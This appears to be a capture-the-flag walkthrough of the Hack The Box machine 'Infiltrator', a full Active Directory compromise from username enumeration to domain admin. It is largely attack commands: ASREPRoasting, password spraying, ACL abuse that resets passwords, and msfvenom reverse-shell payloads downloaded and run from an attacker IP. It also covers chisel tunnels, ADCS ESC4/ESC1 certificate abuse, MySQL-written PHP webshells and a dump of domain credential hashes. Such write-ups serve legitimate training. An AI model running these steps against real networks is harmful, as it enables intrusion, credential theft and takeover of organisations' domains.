---
icon: user-ninja
cover: ../../../../.gitbook/assets/Screenshot 2026-02-23 181300.png
coverY: -11.077499038988748
---

# HTB-INFILTRATOR

### Reconnaissance

#### Port Discovery — RustScan

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ rustscan -a 10.10.11.31 blah blah
```

```
Open 10.10.11.31:53
Open 10.10.11.31:80
Open 10.10.11.31:88
Open 10.10.11.31:135
Open 10.10.11.31:139
Open 10.10.11.31:389
Open 10.10.11.31:445
Open 10.10.11.31:464
Open 10.10.11.31:593
Open 10.10.11.31:636
Open 10.10.11.31:3268
Open 10.10.11.31:3269
Open 10.10.11.31:3389
Open 10.10.11.31:5985
Open 10.10.11.31:9389
```

#### Service Enumeration — Nmap

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ nmap -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 10.10.11.31
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
                             (Domain: infiltrator.htb)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Global Catalog)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (GC SSL)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp open  mc-nmf        .NET Message Framing
```

Key findings: Domain Controller at `dc01.infiltrator.htb`, domain is `INFILTRATOR.HTB`, Windows Server 2019 (build 10.0.17763). The SSL certificates are valid until 2099, confirming this is a self-signed lab environment.

<figure><img src="../../../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ echo '10.10.11.31 dc01.infiltrator.htb infiltrator.htb' | sudo tee -a /etc/hosts
```

#### UDP Scan

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ sudo nmap -Pn -sU --top-ports 1000 10.10.11.31
```

Ports 88/udp (kerberos-sec) and 123/udp (NTP) are open — typical for a Domain Controller.

***

### Enumeration

#### DNS

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ dig any INFILTRATOR.HTB @10.10.11.31
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ dnsenum INFILTRATOR.HTB --dnsserver 10.10.11.31 -f /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --threads 16
```

No zone transfer or interesting subdomains. The domain resolves to 10.10.11.31.

#### Kerberos — Username Enumeration

Since the naming convention is unknown, kerbrute is run against the KDC to brute-force valid usernames:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ kerbrute userenum --dc dc01.infiltrator.htb -d INFILTRATOR.HTB \
    /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 200
```

After running in the background, one valid user is found: `a.walker`. This reveals the naming convention: **first letter of firstname + lastname** (e.g., `a.walker`).

#### LDAP — Null Session

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ ldapsearch -x -H ldap://10.10.11.31:389 -s base -b '' -LLL
```

Anonymous access reveals base DN information (`DC=infiltrator,DC=htb`) but further enumeration requires authentication.

#### MSRPC — Null Session

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ rpcclient 10.10.11.31 -N -U ''
rpcclient $> lsaquery
Domain Sid: S-1-5-21-2606098828-3734741516-3625406802
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ impacket-rpcdump 10.10.11.31
```

466 RPC endpoints discovered. Notable: `certsrv.exe` is running, confirming **Active Directory Certificate Services (ADCS)** is present.

#### SMB — Null Session

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ crackmapexec smb dc01.infiltrator.htb -u ' ' -p ' ' --shares
```

SMB requires authentication — no anonymous access. RID cycling also fails.

#### Web — Port 80

Navigating to `http://infiltrator.htb` reveals a corporate website. A section lists potential employees with names and surnames:

**Names:** David, Olivia, Kevin, Amanda, Marcus, Lauren, Ethan\
**Surnames:** Anderson, Martinez, Turner, Walker, Harris, Clark, Rodriguez

A Python script generates a username wordlist following the `firstname.lastname` and `f.lastname` patterns:

```python
with open('names.txt', 'r') as names_file:
    names = [name.strip() for name in names_file.readlines()]
with open('surnames.txt', 'r') as surnames_file:
    surnames = [surname.strip() for surname in surnames_file.readlines()]

with open('usernames.txt', 'w') as output_file:
    for name, surname in zip(names, surnames):
        output_file.write(f"{name}.{surname}\n")
        output_file.write(f"{name[0]}.{surname}\n")
```

Kerbrute validates these against the domain:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ kerbrute userenum --dc dc01.infiltrator.htb -d infiltrator.htb usernames.txt
```

**Valid domain users confirmed:**

* `D.Anderson@infiltrator.htb`
* `K.Turner@infiltrator.htb`
* `A.Walker@infiltrator.htb`
* `O.Martinez@infiltrator.htb`
* `M.Harris@infiltrator.htb`
* `E.Rodriguez@infiltrator.htb`
* `L.Clark@infiltrator.htb`

These are saved to `valid_users.txt`.

***

### Initial Access | ASREPRoasting

**What is ASREPRoasting?** This attack targets accounts with Kerberos pre-authentication disabled. When pre-auth is off, the KDC will respond to an AS-REQ with an AS-REP encrypted with the user's password-derived key — no authentication required. The attacker captures this hash and cracks it offline.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ impacket-GetNPUsers infiltrator.htb/ -usersfile valid_users.txt -no-pass \
    -dc-ip dc01.infiltrator.htb -outputfile hash.txt
```

User `l.clark` has pre-authentication **disabled**, and a `$krb5asrep$` hash is captured in `hash.txt`.

#### Cracking with Hashcat

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ hashcat -m 18200 -a 0 -o hash_cracked.txt hash.txt /usr/share/wordlists/rockyou.txt
```

**Credentials obtained:**

```
l.clark : WAT?watismypass!
```

***

### Lateral Movement | Password Spray

With a valid credential, a password spray is performed to check for password reuse across all valid users:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ kerbrute passwordspray --dc dc01.infiltrator.htb -d INFILTRATOR.HTB \
    usernames.txt 'WAT?watismypass!'
```

**Password reuse confirmed for `d.anderson`.**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ impacket-getTGT INFILTRATOR.HTB/d.anderson:'WAT?watismypass!' -dc-ip 10.10.11.31
```

A TGT is obtained for `d.anderson`, confirming the credentials are valid.

***

### Active Directory Enumeration | BloodHound

BloodHound automates the collection and visualization of AD relationships to identify attack paths:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ bloodhound-python -d infiltrator.htb -c All --zip -dc infiltrator.htb \
    -ns 10.10.11.31 -u l.clark -p 'WAT?watismypass!'
```

#### BloodHound Findings

| Principal          | Group Membership                                           | Permissions                                |
| ------------------ | ---------------------------------------------------------- | ------------------------------------------ |
| `l.clark`          | `marketing_team`                                           | —                                          |
| `d.anderson`       | `marketing_team`, `protected_users`                        | **GenericAll** on OU `MARKETING DIGITAL`   |
| `e.rodriguez`      | `digital_influencers`                                      | **AddSelf** on `chiefs_marketing`          |
| `chiefs_marketing` | —                                                          | **ForceChangePassword** on `m.harris`      |
| `m.harris`         | `developers`, `protected_users`, `remote_management_users` | PSRemote to DC01                           |
| `o.martinez`       | `chiefs_marketing`, `remote_desktop_users`                 | RDP to DC01                                |
| `lan_management`   | `service_management`                                       | **ReadGMSAPassword** on `infiltrator_svc$` |
| `infiltrator_svc$` | `domain_computers`                                         | ESC4 on `Infiltrator_Template`             |

#### Attack Path Visualization

```
d.anderson --[GenericAll on OU]--> e.rodriguez (via DACL write)
e.rodriguez --[AddSelf]--> chiefs_marketing
chiefs_marketing --[ForceChangePassword]--> m.harris
m.harris --[remote_management_users]--> WinRM access on DC01
```

***

### Privilege Escalation Path 1: d.anderson → m.harris (User Flag)

#### Step 1 — Get TGT for d.anderson

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ impacket-getTGT 'infiltrator.htb/d.anderson:WAT?watismypass!' -dc-ip 10.10.11.31
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ export KRB5CCNAME=d.anderson.ccache
```

#### Step 2 — Abuse GenericAll: Grant FullControl on Marketing Digital OU

`d.anderson` has **GenericAll** over the `MARKETING DIGITAL` OU, meaning full control over all objects within it. This is used to write a DACL granting `d.anderson` FullControl (with inheritance) using `dacledit.py`:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ dacledit.py -action 'write' -rights 'FullControl' -inheritance \
    -principal 'd.anderson' \
    -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' \
    'infiltrator.htb/d.anderson' -k -no-pass -dc-ip 10.10.11.31
```

**Backend behavior:** GenericAll includes WriteDACL. By writing a new ACE granting `d.anderson` FullControl with inheritance, every object (including user `e.rodriguez`) inside that OU becomes controllable. The `-inheritance` flag propagates the ACE down the OU tree automatically.

#### Step 3 — Reset e.rodriguez's Password

Now that `d.anderson` has FullControl over `e.rodriguez` (who lives in the Marketing Digital OU), the password can be forcibly changed:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ pip3 install bloodyAD
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ bloodyAD --host "dc01.infiltrator.htb" -d "infiltrator.htb" \
    --kerberos --dc-ip 10.10.11.31 \
    -u "d.anderson" set password "e.rodriguez" "Darkhood@420"
```

**Credentials:** `e.rodriguez : Darkhood@420`

#### Step 4 — Add e.rodriguez to chiefs\_marketing

`e.rodriguez` has **AddSelf** permission on `chiefs_marketing`, allowing the user to add themselves:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ bloodyAD --host "dc01.infiltrator.htb" -d "infiltrator.htb" \
    --dc-ip 10.10.11.31 -u e.rodriguez -p "Darkhood@420" -k \
    add groupMember "CN=CHIEFS MARKETING,CN=USERS,DC=INFILTRATOR,DC=HTB" e.rodriguez
```

#### Step 5 — Reset m.harris's Password

`chiefs_marketing` has **ForceChangePassword** on `m.harris`. As `e.rodriguez` is now a member:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ bloodyAD --host "dc01.infiltrator.htb" -d "infiltrator.htb" \
    --kerberos --dc-ip 10.10.11.31 \
    -u "e.rodriguez" -p "Darkhood@420" set password "m.harris" "Darkhood@420"
```

**Credentials:** `m.harris : Darkhood@420`

#### Step 6 — WinRM Shell as m.harris (User Flag)

Configure Kerberos for WinRM authentication:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ sudo nvim /etc/krb5.conf
```

```ini
[libdefaults]
default_realm = INFILTRATOR.HTB
dns_lookup_realm = false
dns_lookup_kdc = false
forwardable = true

[realms]
INFILTRATOR.HTB = {
    kdc = dc01.infiltrator.htb
    admin_server = dc01.infiltrator.htb
}

[domain_realm]
.infiltrator.htb = INFILTRATOR.HTB
infiltrator.htb = INFILTRATOR.HTB
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ getTGT.py infiltrator.htb/m.harris:'Darkhood@420' -dc-ip dc01.infiltrator.htb
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ export KRB5CCNAME=m.harris.ccache
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ evil-winrm -i dc01.infiltrator.htb -u m.harris -r infiltrator.htb
```

***

### Post-Exploitation Enumeration

#### Meterpreter Shell (Stability)

Due to session instability, a stable Meterpreter session is established:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.33 LPORT=420 \
    -f exe -o reverse.exe

┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; \
    set lhost 10.10.14.33; set lport 420; exploit -j"

┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ python3 -m http.server 80
```

On victim (via evil-winrm):

```powershell
wget http://10.10.14.33/reverse.exe -o reverse.exe
Start-Process -FilePath "reverse.exe" -WindowStyle Hidden
```

#### WinPEAS

```
meterpreter > upload /opt/winPEAS.exe winpeas.exe
meterpreter > execute -f cmd.exe -a "/c winpeas.exe > winpeas.txt"
meterpreter > download winpeas.txt
```

WinPEAS reveals several interesting findings:

**Output Messenger Services:**

```
OMServerService
outputmessenger_httpd
outputmessenger_mysqld
certsrv
```

Inside the WinPEAS output, a comment containing a password is found:

```
MessengerApp@Pass!
```

**Internal ports associated with Output Messenger:**

* `14118–14130`: OMServerService (messaging ports)
* `14126`: outputmessenger\_httpd (Apache web interface)
* `14406`: outputmessenger\_mysqld (MySQL database)

#### adPEAS

```powershell
upload adPEAS.ps1
Import-Module .\adPEAS.ps1
Invoke-adPEAS
```

adPEAS confirms ADCS is running and detects a vulnerable certificate template: **`Infiltrator_Template`** with `ENROLLEE_SUPPLIES_SUBJECT` and permissions granted to `infiltrator_svc$`.

***

### Privilege Escalation Path 2: Output Messenger — winrm\_svc Credentials

#### Chisel Port Forwarding

To access internal Output Messenger services, chisel tunnels are established:

**Attacker (server mode):**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ ./chisel server -p 6666 --reverse
```

**Victim (via Meterpreter upload):**

```
meterpreter > upload chisel.exe
meterpreter > execute -f cmd.exe -a "/c .\chisel.exe client 10.10.14.33:6666 \
    R:14121:127.0.0.1:14121 R:14122:127.0.0.1:14122 R:14123:127.0.0.1:14123 \
    R:14124:127.0.0.1:14124 R:14125:127.0.0.1:14125 R:14126:127.0.0.1:14126"
```

**Backend:** Chisel creates a reverse SSH-like tunnel over WebSocket. The `-R` flags instruct the client (victim) to forward traffic received on the server's (attacker's) local ports back to specified addresses on the victim's localhost. This bypasses firewall rules since the connection is outbound from the victim.

#### Accessing Output Messenger

Login credentials found via WinPEAS:

```
k.turner : MessengerApp@Pass!
```

After signing in to the Output Messenger desktop application (on a Windows VM), the **My Wall** feed reveals:

1. A post from `Winrm_svc` about Kerberos pre-authentication being disabled for some users.
2.  A post from `K.turner` demonstrating `UserExplorer.exe` with credentials:

    ```
    UserExplorer.exe -u m.harris -p D3v3l0p3r_Pass@1337! -s M.harris
    ```

A file attachment `UserExplorer.exe` is also available in the chat. The Linux client is outdated, so the Windows client must be used for downloading the file.

> **Note on Windows pivoting:** A Chisel server runs on the Windows VM, and the Parrot/Kali client connects to it, forwarding the Output Messenger ports to the Windows machine where the desktop client runs.

#### Reverse Engineering UserExplorer.exe — JetBrains dotPeek

`UserExplorer.exe` is decompiled with **dotPeek** (a .NET decompiler). Inside `UserExplorer/Root Namespace/LdapApp`, a hardcoded credential is found:

* **Username:** `winrm_svc`
* **Encrypted hash:** `TGlu22oo8GIHRkJBBpZ1nQ/x6l36MVj3Ukv4Hw86qGE`

#### AES Decryption

The hash is encrypted with AES-CBC. A Python script decrypts it using the hardcoded key found in the binary:

```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
import base64

def decrypt_string(key: str, cipher_text: str) -> str:
    key_bytes = key.encode('utf-8')
    cipher_bytes = base64.b64decode(cipher_text)
    if len(key_bytes) not in [16, 24, 32]:
        raise ValueError("Key must be 16, 24, or 32 bytes long")
    cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(b'\x00' * 16),
                    backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_bytes = decryptor.update(cipher_bytes) + decryptor.finalize()
    return decrypted_bytes.decode('utf-8')

key = 'b14ca5898a4e4133bbce2ea2315a1916'
cipher_text = 'TGlu22oo8GIHRkJBBpZ1nQ/x6l36MVj3Ukv4Hw86qGE'
# Double-decrypted (encrypted twice in the source)
print(decrypt_string(key, decrypt_string(key, cipher_text)))
```

**Backend:** The string is AES-128-CBC encrypted twice with the same key and an all-zero IV. The `decrypt_string` function is called recursively to peel both layers.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ python3 winrm_svc.py
```

**Credentials obtained:**

```
winrm_svc : WinRm@$svc^!^P
```

#### Evil-WinRM as winrm\_svc

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ evil-winrm -i 10.10.11.31 -u 'winrm_svc' -p 'WinRm@$svc^!^P'
```

#### API Key Extraction

Logging into Output Messenger as `winrm_svc` reveals the **lan\_management API key**:

```
lan_managment api key: 558R501T5I6024Y8JV3B7KOUN1A518GG
```

***

### o.martinez Credentials via Output Messenger API + PCAP

#### Enumerating Chat Rooms via API

Port 14125 exposes the Output Messenger API. With the API key:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ curl -s -k -H 'APIKEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' \
    -H 'Accept: application/json, text/javascript, */*' \
    -H 'Host: infiltrator.htb:14125' \
    'http://127.0.0.1:14125/api/chatrooms/'
```

The `Chiefs_Marketing_chat` room is found with roomkey `20240220014618@conference.com`.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ curl -s -k -H 'APIKEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' \
    -H 'Accept: application/json, text/javascript, */*' \
    'http://127.0.0.1:14125/api/chatrooms/logs?roomkey=20240220014618@conference.com&fromdate=2024/02/01&todate=2024/09/01' | jq '.logs'
```

Chat logs reveal `o.martinez` shared their credentials in this room:

```
o.martinez : m@rtinez@1996!
```

#### PCAP Analysis — BitLocker Recovery Key

Inside the `winrm_svc` Output Messenger session, a received file `network_capture_2024.pcapng` is found:

```
meterpreter > download network_capture_2024.pcapng
```

Analyzing with Wireshark (filter: `http`):

* Basic auth credential found: `securepassword`
* A GET request to `/view/BitLocker-backup.7z` reveals the download of a BitLocker backup archive
* Server responds with 5727 bytes; the TCP segments are reassembled to 209,327 bytes total

Extracting the raw hex from Wireshark and converting:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ cat BitLocker_backup.hex | xxd -r -p > BitLocker_backup.7z
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ 7z l BitLocker_backup.7z
```

The archive is password-protected. Cracking with John:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ 7z2john BitLocker_backup.7z > BitLocker_backup.7z.hash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ john BitLocker_backup.7z.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Password:** `zipper`

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ 7z x BitLocker_backup.7z
```

Extracted: `Microsoft account _ Clés de récupération BitLocker.html`

**BitLocker Recovery Key:**

```
650540-413611-429792-307362-466070-397617-148445-087043
```

#### o.martinez Cleartext Password (PCAP POST Request)

Also in the PCAP, a POST request to `/api/change_auth_token` contains o.martinez's password in cleartext:

```
o.martinez : M@rtinez_P@ssw0rd!
```

***

### Output Messenger Calendar RCE — o.martinez Shell

The Output Messenger calendar supports executing programs at scheduled times. This can be abused for code execution:

**Step 1 — Generate payload:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.33 LPORT=666 \
    -f exe -o darkshell.exe
```

**Step 2 — Upload to victim:**

```
evil-winrm > cd / ; mkdir darkhood ; cd darkhood
meterpreter > upload darkshell.exe
```

**Step 3 — Schedule calendar event:** In the Output Messenger desktop client (logged in as o.martinez), create a calendar event that executes `C:\darkhood\darkshell.exe`, accounting for the 2-hour clock difference between local and victim machine.

After the event fires, a Meterpreter session is obtained as `o.martinez`.

***

### RDP as o.martinez — BitLocker Unlock

`o.martinez` is in `Remote_Desktop_Users`:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ xfreerdp /u:o.martinez /p:'M@rtinez_P@ssw0rd!' /v:10.10.11.31 \
    /cert:ignore /dynamic-resolution /tls-seclevel:0
```

Opening **My PC**, drive `E:` is BitLocker encrypted. Using the recovery key found in the PCAP HTML file:

**Recovery Key:** `650540-413611-429792-307362-466070-397617-148445-087043`

After unlocking, a file `Backup_Credentials.7z` is found at:

```
E:\Windows Server 2012 R2 - Backups\Users\Administrator\Documents\
```

```
meterpreter > download Backup_Credentials.7z
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ 7z x Backup_Credentials.7z
```

Contents:

* `Active Directory/ntds.dit` — Active Directory database
* `registry/SYSTEM` — Registry hive (needed for decryption key)
* `registry/SECURITY` — Additional security registry hive

***

### NTDS.dit Extraction — lan\_management Password

Convert NTDS.dit to SQLite for easy querying:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ git clone https://github.com/almandin/ntdsdotsqlite
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ ntdsdotsqlite 'Active Directory/ntds.dit' --system registry/SYSTEM -o NTDS.sqlite
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ sqlitebrowser NTDS.sqlite
```

**Backend:** NTDS.dit is a Jet ESE database storing AD objects. The SYSTEM hive contains the BOOTKEY, which is used to decrypt the PEK (Password Encryption Key) in NTDS.dit. The PEK in turn decrypts the individual user password hashes.

Browsing the `user_accounts` table, the `description` field for `lan_management` contains a cleartext password:

**Credentials obtained:**

```
lan_management : l@n_M@an!1331
```

***

### gMSA Password Extraction — infiltrator\_svc$ NTLM

`lan_management` has **ReadGMSAPassword** on `infiltrator_svc$` (Group Managed Service Account). GMSA passwords are 256-character random secrets rotated automatically by AD, but authorized accounts can read the current password from the `msDS-ManagedPassword` LDAP attribute:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ netexec ldap 10.10.11.31 -u 'lan_managment' -p 'l@n_M@an!1331' --gmsa
```

**infiltrator\_svc$ NTLM hash obtained:**

```
ae7458d8f82eadb24181f918e0c70e7d
```

***

### Privilege Escalation — ADCS ESC4 → ESC1 → Domain Admin

#### Background

**ADCS (Active Directory Certificate Services)** issues X.509 certificates for authentication. Misconfigured templates can be abused (PortSwigger/Will Schroeder's "Certified Pre-Owned" research).

**ESC4** occurs when an attacker has **write permissions** on a certificate template. This allows modifying the template's flags to introduce ESC1-style vulnerabilities.

**ESC1** occurs when a template has `ENROLLEE_SUPPLIES_SUBJECT` enabled and allows enrollment by a compromised account. The attacker can request a certificate for **any** UPN (including `administrator@infiltrator.htb`).

#### Step 1 — Find Vulnerable Templates

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ certipy find -u 'infiltrator_svc$' -hashes ae7458d8f82eadb24181f918e0c70e7d \
    -dc-ip 10.10.11.31 -vulnerable -stdout
```

Template `Infiltrator_Template` is vulnerable to **ESC4** — `infiltrator_svc$` has write access to the template object.

#### Step 2 — Exploit ESC4: Write Template to Enable ESC1

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ certipy template -u 'infiltrator_svc$' -hashes 'ae7458d8f82eadb24181f918e0c70e7d' \
    -dc-ip 10.10.11.31 -template 'Infiltrator_Template' -save-old -debug
```

This overwrites the template's attributes to enable `ENROLLEE_SUPPLIES_SUBJECT` and makes it vulnerable to ESC1. The `-save-old` flag backs up the original template (for restoration).

#### Step 3 — Request Certificate for Administrator (ESC1)

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ certipy req -debug -u 'infiltrator_svc$@infiltrator.htb' \
    -hashes ':ae7458d8f82eadb24181f918e0c70e7d' \
    -ca 'infiltrator-DC01CA' \
    -template 'Infiltrator_Template' \
    -upn 'administrator@infiltrator.htb' \
    -target-ip 10.10.11.31
```

A certificate `administrator.pfx` is obtained for the `administrator` account.

#### Step 4 — Authenticate and Get NTLM Hash

`faketime` is used to account for clock skew:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ faketime -f "+2h" certipy auth -pfx administrator.pfx \
    -domain infiltrator.htb -dc-ip 10.10.11.31
```

**Administrator NTLM hash obtained:**

```
[*] Got hash for 'administrator@infiltrator.htb':
    aad3b435b51404eeaad3b435b51404ee:1356f502d2764368302ff0369b1121a1
```

#### Step 5 — Evil-WinRM as Administrator

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ evil-winrm -i 10.10.11.31 -u "administrator" -H "1356f502d2764368302ff0369b1121a1"
```

Domain admin access achieved.

***

### SYSTEM Shell via Output Messenger MySQL WebShell

After obtaining administrator access, further enumeration reveals:

**`C:\Program Files\Output Messenger Server\Plugins\Output\OutputMysql.ini`**

```ini
[DBCONFIG]
SQLPort=14406
DBUsername=root
DBPassword="#MySQLPassword!"
DBName=outputwall
```

**`C:\Program Files\Output Messenger Server\Plugins\Output\OutputApache.ini`**

```ini
[SETTINGS]
Address=127.0.0.1
WebPort=14126
```

#### Port Forwarding MySQL and HTTP

```
meterpreter > upload chisel_windows.exe
meterpreter > execute -f cmd.exe -a "/c .\chisel_windows.exe client 10.10.14.33:6666 \
    R:14406:127.0.0.1:14406 R:14126:127.0.0.1:14126"
```

#### MySQL Access

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ mysql -h 127.0.0.1 -P 14406 --skip-ssl -u root -p
# Password: #MySQLPassword!
```

```sql
mysql> select version();
-- 10.1.19-MariaDB

mysql> select @@basedir;
-- C:\Program Files\Output Messenger Server\Plugins\Output\mysql\
```

#### Writing a WebShell

Verify no PHP restrictions:

```sql
SELECT LOAD_FILE('C:\\Program Files\\Output Messenger Server\\Plugins\\Output\\php\\php.ini');
-- disable_functions is empty!
```

Write a webshell to the Apache www directory:

```sql
SELECT "<?php echo `whoami`; ?>" 
INTO OUTFILE 
"C:\\Program Files\\Output Messenger Server\\Plugins\\Output\\www\\whoami.php";
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ curl http://127.0.0.1:14126/whoami.php
nt authority\system
```

**Apache runs as `NT AUTHORITY\SYSTEM`!** PHP's `disable_functions` is empty, so backtick execution works directly.

#### SYSTEM Meterpreter Shell

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.33 LPORT=6060 \
    -f exe -o revshell.exe
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; \
    set lhost 10.10.14.33; set lport 6060; exploit -j"
```

Upload `revshell.exe` to `C:\darkhood\`, then execute via MySQL:

```sql
SELECT "<?php echo `C:\\darkhood\\revshell.exe`; ?>" 
INTO OUTFILE 
"C:\\Program Files\\Output Messenger Server\\Plugins\\Output\\www\\rev_shell.php";
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ curl http://127.0.0.1:14126/rev_shell.php
```

Full `NT AUTHORITY\SYSTEM` Meterpreter session obtained on `dc01.infiltrator.htb`.

***

### Domain Credential Dump

```bash
┌──(sn0x㉿sn0x)-[~/HTB/infiltrator]
└─$ secretsdump.py Administrator@10.10.11.31 -hashes :1356f502d2764368302ff0369b1121a1 -just-dc-ntlm
```

```
Administrator:500::1356f502d2764368302ff0369b1121a1
Guest:501::31d6cfe0d16ae931b73c59d7e0c089c0
krbtgt:502::d400d2ccb162e93b66e8025118a55104
D.anderson:1103::627a2cb0adc7ba12ea11174941b3da88
L.clark:1104::627a2cb0adc7ba12ea11174941b3da88
M.harris:1105::3ed8cf1bd9504320b50b2191e8fb7069
O.martinez:1106::daf40bbfbf00619b01402e5f3acd40a9
A.walker:1107::f349468bb2c669ec8c3fd4154fdfe126
K.turner:1108::a119c0d5af383e9591ebb67857e2b658
E.rodriguez:1109::627a2cb0adc7ba12ea11174941b3da88
winrm_svc:1601::120c6c7a0acb0cd808e4b601a4f41fd4
lan_managment:8101::a1983d156e1d0fdf9b01208e2b46670d
DC01$:1000::c4d8ecef85fdd70a87fa9c8da56a417f
infiltrator_svc$:3102::ae7458d8f82eadb24181f918e0c70e7d
```

***

### Attack Flow

```
RustScan → Kerbrute Username Enum → Web Scraping Users → ASREPRoasting (l.clark)
→ Password Spray (d.anderson) → BloodHound → dacledit GenericAll abuse
→ e.rodriguez password reset → AddSelf → m.harris password reset
→ Evil-WinRM as m.harris → WinPEAS → Output Messenger (OMServerService)
→ Chisel Port Forwarding → Output Messenger App (k.turner: MessengerApp@Pass!)
→ UserExplorer.exe decompile → AES decrypt winrm_svc hash
→ Evil-WinRM as winrm_svc → API Key → o.martinez cleartext creds (pcap)
→ Calendar RCE → BitLocker recovery key → RDP as o.martinez
→ BitLocker unlock → NTDS.dit → lan_management password
→ gMSA: infiltrator_svc$ NTLM → ESC4 → ESC1 → Admin certificate
→ Evil-WinRM as Administrator → SYSTEM via MySQL WebShell
```

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
